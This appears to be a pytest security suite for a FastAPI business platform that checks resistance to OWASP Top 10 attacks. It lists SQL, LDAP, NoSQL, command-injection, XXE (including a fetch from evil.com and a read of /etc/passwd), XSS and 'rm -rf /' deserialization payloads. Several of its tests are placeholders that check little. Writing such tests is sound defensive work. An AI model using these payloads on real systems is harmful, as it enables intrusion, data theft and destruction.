"""
OWASP Security Testing Suite for BBB Platform
Copyright (c) 2025 Joshua Hendricks Cole (DBA: Corporation of Light). All Rights Reserved. PATENT PENDING.

Comprehensive security testing covering OWASP Top 10 and beyond:
- Injection attacks (SQL, NoSQL, LDAP, etc.)
- Broken Authentication
- Sensitive Data Exposure
- XML External Entities (XXE)
- Broken Access Control
- Security Misconfiguration
- Cross-Site Scripting (XSS)
- Insecure Deserialization
- Vulnerable Components
- Insufficient Logging and Monitoring
- Additional security tests (CSRF, Clickjacking, etc.)
"""

import pytest
import json
import base64
import xml.etree.ElementTree as ET
from urllib.parse import quote
from fastapi.testclient import TestClient

from blank_business_builder.main import app
from blank_business_builder.database import Base, get_db

# Import centralized test fixtures from conftest.py
from .conftest import client

class TestInjectionAttacks:
    """Test injection attacks (OWASP A03:2021 - Injection)."""

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention."""
        # Get authenticated user
        auth_response = client.post("/api/auth/register", json={
            "email": "injection@test.com",
            "password": "injectionpass123",
            "full_name": "Injection Test User"
        })
        token = auth_response.json()["access_token"]

        # Test classic SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE users; --",
            "admin' OR '1'='1",
            "test@example.com'; UPDATE users SET subscription_tier='enterprise'; --",
            "test@example.com' UNION SELECT * FROM users --",
            "test@example.com' AND (SELECT COUNT(*) FROM users) > 0 --",
        ]

        for payload in sql_payloads:
            response = client.post("/api/auth/login", json={
                "email": payload,
                "password": "password123"
            })
            # Should either fail gracefully or succeed only if payload is valid
            assert response.status_code in [400, 401, 422], f"SQL injection attempt should fail: {payload}"

    def test_nosql_injection_prevention(self):
        """Test NoSQL injection prevention."""
        # Test MongoDB-style injection (even if not using MongoDB)
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
        ]

        for payload in nosql_payloads:
            response = client.post("/api/marketing/contacts", json={
                "email": f"nosql{payload}@test.com",
                "name": "NoSQL Test"
            })
            # Should either succeed or fail gracefully, not crash
            assert response.status_code in [200, 400, 422, 429]

    def test_ldap_injection_prevention(self):
        """Test LDAP injection prevention."""
        # Test LDAP injection patterns
        ldap_payloads = [
            "*)(uid=*",
            "*)(|(objectClass=*))",
            "*)(&(objectClass=user)(cn=*))",
        ]

        for payload in ldap_payloads:
            response = client.post("/api/auth/login", json={
                "email": f"ldap{payload}@test.com",
                "password": "password123"
            })
            # Should fail gracefully
            assert response.status_code in [400, 401, 422]

    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        # Test command injection payloads
        command_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "$(whoami)",
            "`whoami`",
        ]

        for payload in command_payloads:
            response = client.post("/api/businesses", json={
                "business_name": f"Command{payload}",
                "industry": "Technology",
                "description": "Command injection test"
            })
            # Should either succeed or fail gracefully
            assert response.status_code in [200, 400, 422, 429]

class TestAuthenticationSecurity:
    """Test authentication security (OWASP A07:2021 - Identification and Authentication Failures)."""

    def test_weak_password_rejection(self):
        """Test weak password rejection."""
        weak_passwords = [
            "123",
            "password",
            "qwerty",
            "admin",
            "letmein",
        ]

        for password in weak_passwords:
            response = client.post("/api/auth/register", json={
                "email": f"weak{password}@test.com",
                "password": password,
                "full_name": "Weak Password User"
            })
            # Should reject weak passwords
            assert response.status_code in [400, 422], f"Weak password should be rejected: {password}"

    def test_brute_force_protection(self):
        """Test brute force attack protection."""
        # Attempt multiple rapid login failures
        failure_count = 0
        for i in range(20):
            response = client.post("/api/auth/login", json={
                "email": "nonexistent@test.com",
                "password": f"wrongpass{i}"
            })

            if response.status_code == 401:
                failure_count += 1

        # Should see consistent 401 responses (no progressive delays in basic auth)
        assert failure_count > 0, "Should have some authentication failures"

    def test_session_fixation_prevention(self):
        """Test session fixation prevention."""
        # Register user and get token
        response = client.post("/api/auth/register", json={
            "email": "session@test.com",
            "password": "sessionpass123",
            "full_name": "Session Test User"
        })
        token1 = response.json()["access_token"]

        # Use token for some operations
        client.get("/api/auth/me", headers={"Authorization": f"Bearer {token1}"})

        # Register again (should get new token)
        response2 = client.post("/api/auth/register", json={
            "email": "session2@test.com",
            "password": "sessionpass456",
            "full_name": "Session Test User 2"
        })
        token2 = response2.json()["access_token"]

        # Tokens should be different
        assert token1 != token2, "Should generate new tokens for each session"

    def test_account_lockout_mechanism(self):
        """Test account lockout after failed attempts."""
        # This would test if the system implements account lockout
        # For now, we verify that repeated failures don't compromise security
        for i in range(50):
            response = client.post("/api/auth/login", json={
                "email": "lockout@test.com",
                "password": f"wrongpass{i}"
            })

            # Should consistently return 401, not escalate to other errors
            assert response.status_code == 401, f"Repeated failures should return 401, got {response.status_code}"

class TestSensitiveDataExposure:
    """Test sensitive data exposure prevention (OWASP A02:2021 - Cryptographic Failures)."""

    def test_password_hashing_strength(self):
        """Test password hashing strength."""
        # Test that passwords are properly hashed
        response = client.post("/api/auth/register", json={
            "email": "hashing@test.com",
            "password": "StrongPass123!",
            "full_name": "Hashing Test User"
        })

        assert response.status_code == 200

        # Password should not appear in plain text in any response
        response_text = response.text.lower()
        assert "strongpass123!" not in response_text, "Password should not appear in plain text"

    def test_https_enforcement(self):
        """Test HTTPS enforcement."""
        # In a real test environment, we'd check for HTTPS redirects
        # For now, we verify that HTTP requests work (in development)
        response = client.get("/health")
        assert response.status_code == 200, "Health check should work over HTTP in development"

    def test_token_security(self):
        """Test JWT token security."""
        # Register user and get token
        response = client.post("/api/auth/register", json={
            "email": "token@test.com",
            "password": "tokenpass123",
            "full_name": "Token Test User"
        })
        token = response.json()["access_token"]

        # Token should be properly formatted JWT
        parts = token.split('.')
        assert len(parts) == 3, "JWT should have 3 parts"

        # Should be able to decode header and payload
        import base64
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

        assert "alg" in header, "JWT header should contain algorithm"
        assert "exp" in payload, "JWT payload should contain expiration"
        assert "sub" in payload, "JWT payload should contain subject"

    def test_data_minimization(self):
        """Test that sensitive data is not over-exposed."""
        # Register user
        response = client.post("/api/auth/register", json={
            "email": "exposure@test.com",
            "password": "exposurepass123",
            "full_name": "Exposure Test User"
        })
        token = response.json()["access_token"]

        # Get user profile
        response = client.get("/api/auth/me", headers={"Authorization": f"Bearer {token}"})

        assert response.status_code == 200
        data = response.json()

        # Should not expose sensitive information
        assert "password" not in data, "Password hash should not be exposed"
        assert "hashed_password" not in data, "Hashed password should not be exposed"

        # Should expose necessary information
        assert "email" in data, "Email should be exposed"
        assert "subscription_tier" in data, "Subscription tier should be exposed"

class TestBrokenAccessControl:
    """Test access control mechanisms (OWASP A01:2021 - Broken Access Control)."""

    def test_horizontal_privilege_escalation(self):
        """Test horizontal privilege escalation prevention."""
        # Create two users
        user1_response = client.post("/api/auth/register", json={
            "email": "user1@access.com",
            "password": "accesspass123",
            "full_name": "Access User 1"
        })
        user1_token = user1_response.json()["access_token"]

        user2_response = client.post("/api/auth/register", json={
            "email": "user2@access.com",
            "password": "accesspass456",
            "full_name": "Access User 2"
        })
        user2_token = user2_response.json()["access_token"]

        # Create business for user 1
        business_response = client.post("/api/businesses", json={
            "business_name": "User 1 Business",
            "industry": "Technology",
            "description": "User 1's business"
        }, headers={"Authorization": f"Bearer {user1_token}"})

        assert business_response.status_code == 200
        business_id = business_response.json()["id"]

        # User 2 should not be able to access User 1's business
        response = client.get("/api/businesses", headers={"Authorization": f"Bearer {user2_token}"})
        assert response.status_code == 200

        businesses = response.json()
        business_ids = [b["id"] for b in businesses]

        # User 2's business list should not contain User 1's business
        assert business_id not in business_ids, "User 2 should not see User 1's businesses"

    def test_vertical_privilege_escalation(self):
        """Test vertical privilege escalation prevention."""
        # Test free tier user trying to access pro features
        free_response = client.post("/api/auth/register", json={
            "email": "free@privilege.com",
            "password": "privilegepass123",
            "full_name": "Privilege Free User"
        })
        free_token = free_response.json()["access_token"]

        # Should not be able to access quantum features
        response = client.get("/api/quantum/status", headers={"Authorization": f"Bearer {free_token}"})
        assert response.status_code == 403, "Free tier should not access quantum features"

    def test_idor_prevention(self):
        """Test Insecure Direct Object Reference (IDOR) prevention."""
        # Create two users with businesses
        user1_response = client.post("/api/auth/register", json={
            "email": "idor1@test.com",
            "password": "idorpass123",
            "full_name": "IDOR User 1"
        })
        user1_token = user1_response.json()["access_token"]

        user2_response = client.post("/api/auth/register", json={
            "email": "idor2@test.com",
            "password": "idorpass456",
            "full_name": "IDOR User 2"
        })
        user2_token = user2_response.json()["access_token"]

        # Create business for user 1
        business1_response = client.post("/api/businesses", json={
            "business_name": "IDOR Business 1",
            "industry": "Technology",
            "description": "IDOR test business 1"
        }, headers={"Authorization": f"Bearer {user1_token}"})

        assert business1_response.status_code == 200
        business1_id = business1_response.json()["id"]

        # Create business for user 2
        business2_response = client.post("/api/businesses", json={
            "business_name": "IDOR Business 2",
            "industry": "Healthcare",
            "description": "IDOR test business 2"
        }, headers={"Authorization": f"Bearer {user2_token}"})

        assert business2_response.status_code == 200
        business2_id = business2_response.json()["id"]

        # User 1 should not be able to access User 2's business by ID
        # Note: This test assumes businesses are properly isolated by user_id
        # In a real implementation, we'd test direct ID access attempts

        # For now, we verify that each user's business list only contains their own businesses
        user1_businesses = client.get("/api/businesses", headers={"Authorization": f"Bearer {user1_token}"}).json()
        user2_businesses = client.get("/api/businesses", headers={"Authorization": f"Bearer {user2_token}"}).json()

        user1_ids = [b["id"] for b in user1_businesses]
        user2_ids = [b["id"] for b in user2_businesses]

        # No overlap between user business lists
        assert not set(user1_ids).intersection(set(user2_ids)), "Users should not share business IDs"

class TestXXEAndXMLSecurity:
    """Test XML External Entity (XXE) attacks (OWASP A04:2021 - Insecure Design)."""

    def test_xml_parsing_security(self):
        """Test XML parsing security."""
        # Test XXE payloads
        xxe_payloads = [
            """<?xml version="1.0"?>
            <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <business>
                <name>&xxe;</name>
                <industry>Technology</industry>
            </business>""",
            """<?xml version="1.0"?>
            <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">
            ]>
            <business>
                <name>&xxe;</name>
                <industry>Technology</industry>
            </business>""",
        ]

        for payload in xxe_payloads:
            response = client.post("/api/businesses",
                                 data=payload,
                                 headers={"Content-Type": "application/xml"})
            # Should either succeed or fail gracefully, not expose sensitive data
            assert response.status_code in [200, 400, 415, 422], f"XXE payload should be handled safely: {response.status_code}"

class TestXSSPrevention:
    """Test Cross-Site Scripting (XSS) prevention (OWASP A03:2021 - Injection)."""

    def test_xss_injection_prevention(self):
        """Test XSS injection prevention."""
        # Get authenticated user
        auth_response = client.post("/api/auth/register", json={
            "email": "xss@test.com",
            "password": "xsspass123",
            "full_name": "XSS Test User"
        })
        token = auth_response.json()["access_token"]

        # Test XSS payloads
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "'; alert('xss'); //",
            "\"><script>alert('xss')</script>",
        ]

        for payload in xss_payloads:
            response = client.post("/api/businesses", json={
                "business_name": payload,
                "industry": "Technology",
                "description": "XSS test business"
            }, headers={"Authorization": f"Bearer {token}"})

            if response.status_code == 200:
                # If accepted, verify XSS is escaped in response
                data = response.json()
                business_name = data.get("business_name", "")
                # Check that script tags are not present (escaped or filtered)
                assert "<script>" not in business_name, f"XSS payload not properly handled: {payload}"

    def test_dom_based_xss_prevention(self):
        """Test DOM-based XSS prevention."""
        # Test URL-based XSS attempts
        xss_urls = [
            "/health<script>alert('xss')</script>",
            "/api/businesses?filter=<script>alert('xss')</script>",
        ]

        for url in xss_urls:
            response = client.get(url)
            # Should handle gracefully
            assert response.status_code in [200, 400, 404, 422], f"DOM XSS attempt should be handled safely: {url}"

class TestInsecureDeserialization:
    """Test insecure deserialization prevention (OWASP A08:2021 - Software and Data Integrity Failures)."""

    def test_json_deserialization_security(self):
        """Test JSON deserialization security."""
        # Test malicious JSON payloads
        malicious_json = [
            '{"__class__": "os", "__method__": "system", "__args__": ["rm -rf /"]}',
            '{"__import__": "os", "__call__": "system", "__args__": ["whoami"]}',
        ]

        for payload in malicious_json:
            try:
                parsed = json.loads(payload)
                # If parsing succeeds, verify it's handled safely
                response = client.post("/api/businesses", json=parsed)
                # Should either succeed or fail gracefully
                assert response.status_code in [200, 400, 422, 429]
            except json.JSONDecodeError:
                # JSON parsing should fail for malicious payloads
                pass

class TestSecurityMisconfiguration:
    """Test security misconfiguration detection (OWASP A05:2021 - Security Misconfiguration)."""

    def test_error_information_leakage(self):
        """Test that errors don't leak sensitive information."""
        # Test various error conditions
        error_scenarios = [
            ("/api/auth/login", "POST", {"email": "test@test.com", "password": ""}),
            ("/api/businesses", "POST", {"business_name": "", "industry": "Technology"}),
            ("/api/nonexistent", "GET", {}),
        ]

        for url, method, data in error_scenarios:
            if method == "POST":
                response = client.post(url, json=data)
            else:
                response = client.get(url)

            if response.status_code >= 400:
                response_text = response.text.lower()

                # Should not expose sensitive information
                sensitive_terms = [
                    "password", "secret", "key", "token", "database",
                    "sql", "exception", "traceback", "stack"
                ]

                for term in sensitive_terms:
                    assert term not in response_text, f"Error response should not contain '{term}': {response_text}"

    def test_headers_security(self):
        """Test security headers."""
        response = client.get("/health")

        # Check for security headers
        headers = response.headers

        # Should have basic security headers (in production these would be more comprehensive)
        # Note: FastAPI may add some headers automatically

        # Content-Type should be set
        assert "content-type" in headers, "Content-Type header should be set"

        # Check for CORS headers (configured in app)
        # This would depend on your CORS configuration

class TestVulnerableComponents:
    """Test for vulnerable components (OWASP A06:2021 - Vulnerable and Outdated Components)."""

    def test_dependency_security(self):
        """Test for known vulnerable dependencies."""
        # This would typically be tested with tools like safety, bandit, etc.
        # For now, we verify that the application starts without dependency issues

        # Test that the app can import all dependencies without issues
        try:
            from blank_business_builder.main import app
            from blank_business_builder.database import Base
            from blank_business_builder.auth import AuthService

            # If imports succeed, dependencies are likely okay
            assert app is not None
            assert Base is not None
            assert AuthService is not None

        except ImportError as e:
            pytest.fail(f"Dependency import failed: {e}")

    def test_version_compatibility(self):
        """Test version compatibility."""
        # Test that components work together properly
        response = client.get("/health")
        assert response.status_code == 200, "Components should work together properly"

class TestLoggingAndMonitoring:
    """Test logging and monitoring (OWASP A09:2021 - Security Logging and Monitoring Failures)."""

    def test_audit_logging(self):
        """Test that security events are logged."""
        # Test authentication events
        response = client.post("/api/auth/register", json={
            "email": "audit@test.com",
            "password": "auditpass123",
            "full_name": "Audit Test User"
        })

        assert response.status_code == 200

        # In a real implementation, we'd verify that this registration was logged
        # For now, we verify that the operation completed successfully

    def test_suspicious_activity_detection(self):
        """Test detection of suspicious activities."""
        # Test rapid failed login attempts
        for i in range(10):
            response = client.post("/api/auth/login", json={
                "email": "suspicious@test.com",
                "password": f"wrongpass{i}"
            })

            assert response.status_code == 401, "Failed logins should return 401"

        # In a real implementation, we'd verify that these attempts were flagged
        # For now, we verify that the operations completed

class TestAdditionalSecurity:
    """Additional security tests beyond OWASP Top 10."""

    def test_csrf_protection(self):
        """Test CSRF protection."""
        # Test that POST requests without proper origin are handled
        # Note: FastAPI doesn't implement CSRF by default, but we can test CORS

        # Test with different origins
        headers_with_origin = {
            "Origin": "https://malicious-site.com",
            "Referer": "https://malicious-site.com/attack"
        }

        response = client.post("/api/auth/register",
                             json={"email": "csrf@test.com", "password": "csrfpass123"},
                             headers=headers_with_origin)

        # Should either succeed (if CORS allows) or be properly handled
        assert response.status_code in [200, 403, 422], "CSRF attempt should be handled safely"

    def test_clickjacking_protection(self):
        """Test clickjacking protection."""
        # Test for X-Frame-Options header
        response = client.get("/health")

        # In a real implementation, we'd check for X-Frame-Options: DENY or SAMEORIGIN
        # For now, we verify the response is successful

        assert response.status_code == 200, "Clickjacking protection should not break functionality"

    def test_content_security_policy(self):
        """Test Content Security Policy."""
        # Test for CSP headers
        response = client.get("/health")

        # In a real implementation, we'd check for Content-Security-Policy header
        # For now, we verify basic functionality

        assert response.status_code == 200, "CSP should not break functionality"

    def test_input_validation_comprehensive(self):
        """Comprehensive input validation testing."""
        # Get authenticated user
        auth_response = client.post("/api/auth/register", json={
            "email": "validation@test.com",
            "password": "validationpass123",
            "full_name": "Validation Test User"
        })
        token = auth_response.json()["access_token"]

        # Test various invalid input types
        invalid_inputs = [
            # Extremely long strings
            {"business_name": "x" * 10000, "industry": "Technology", "description": "Test"},
            # Special characters
            {"business_name": "!@#$%^&*()", "industry": "Technology", "description": "Test"},
            # Unicode characters
            {"business_name": "测试业务", "industry": "Technology", "description": "Test"},
            # Null bytes
            {"business_name": "Test\x00Business", "industry": "Technology", "description": "Test"},
            # Control characters
            {"business_name": "Test\x01\x02Business", "industry": "Technology", "description": "Test"},
        ]

        for invalid_input in invalid_inputs:
            response = client.post("/api/businesses", json=invalid_input, headers={"Authorization": f"Bearer {token}"})
            # Should either succeed or fail gracefully with proper error messages
            assert response.status_code in [200, 400, 422, 429], f"Invalid input should be handled safely: {invalid_input}"

if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "--tb=short"])
